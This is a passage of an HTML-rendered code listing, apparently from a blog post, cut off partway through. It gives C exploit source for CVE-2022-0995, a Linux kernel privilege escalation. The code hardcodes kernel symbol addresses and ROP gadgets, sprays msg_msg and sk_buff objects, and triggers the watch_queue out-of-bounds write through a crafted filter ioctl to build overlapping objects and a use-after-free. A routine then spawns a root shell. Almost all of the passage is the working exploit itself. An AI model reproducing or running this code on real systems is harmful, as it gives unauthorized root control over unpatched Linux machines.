class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/watch_queue.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a63be0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_rflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;secondary_msg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_secondary_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next,</span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> m_list_prev, <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts, </span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span><br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> *<span class="hljs-title">wfilter</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nfilters;<br>    <br>    nfilters = <span class="hljs-number">4</span>;<br>    wfilter = (<span class="hljs-keyword">struct</span> watch_notification_filter*)<br>            <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> watch_notification_filter)<br>                + nfilters * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> watch_notification_type_filter));<br>    wfilter-&gt;nr_filters = nfilters;<br><br>    <span class="hljs-comment">// normal filter</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (nfilters - <span class="hljs-number">1</span>); i++)<br>        wfilter-&gt;filters[i].type = <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-comment">// evil filter</span><br>    <span class="hljs-comment">// 0x300 = 64 * 12, 12 * 8 = 96bytes</span><br>    <span class="hljs-comment">// 1 &lt;&lt; 0xa = 1024, maybe we can hit a proper bit</span><br>    wfilter-&gt;filters[nfilters - <span class="hljs-number">1</span>].type = <span class="hljs-number">0x30a</span>;<br><br>    <span class="hljs-comment">// triger oob write</span><br>    <span class="hljs-keyword">if</span> (ioctl(pipe_fd[<span class="hljs-number">0</span>], IOC_WATCH_QUEUE_SET_FILTER, wfilter) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!&quot;</span>);<br>    <br>    <span class="hljs-comment">// prevent memory leak in userspace(no need in fact)</span><br>    <span class="hljs-built_in">free</span>(wfilter);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         oob_pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br><br>    saveStatus();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.O</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] CVE-2022-0995 Linux Privilege Escalation.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// run the exp on specific core only</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">// pipe to trigert off-by-null</span><br>    <span class="hljs-keyword">if</span> (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to create O_NOTIFICATION_PIPE!&quot;</span>);<br>    <br>    <span class="hljs-comment">// socket pairs to spray sk_buff</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">// build 4096 message queue</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">// spray primary and secondary message</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// create hole in primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// triger off-by-null on primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(oob_pipe_fd);<br><br>    <span class="hljs-comment">// find the queues that have the same secondary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">1024</span>) == <span class="hljs-number">0</span>)  <span class="hljs-comment">// the hole</span><br>            <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG)<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i)<br>        &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, <br>            victim_qid, real_qid);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span 